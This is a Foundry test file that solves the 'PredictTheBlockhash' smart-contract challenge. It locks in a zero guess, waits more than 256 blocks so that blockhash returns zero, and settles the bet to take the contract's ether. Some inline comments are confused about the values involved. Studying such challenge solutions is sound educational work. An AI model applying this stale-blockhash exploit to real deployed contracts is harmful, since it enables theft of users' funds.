// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
    }

    // In this challenge, the vulnerability lies in the PredictTheBlockhash contract.
    // hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero
    // We need to just wait for 256 blocks before calling settle which will result in 0x hash.
    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;
        // To roll forward, add the number of blocks to blockNumber,
        // Eg. roll forward 10 blocks: blockNumber + 10
        vm.roll(blockNumber + 10);

        // Put your solution here
        // hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero
        bytes32 guess = blockhash(block.number); // 0x
        console.logBytes32(guess);
        predictTheBlockhash.lockInGuess{value: 1 ether}(guess);
        vm.roll(block.number + 258); // settle will check for settlementBlockNumber which was set as blockNumber of lockInGuess tx +1
        bytes32 expectedHash = (blockhash(block.number - 1));
        console.logBytes32(expectedHash);
        //assertEq(expectedHash, guess); // why expectedHash (0x10c) != guess  (0x) but in settle function it is 0x
        predictTheBlockhash.settle();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
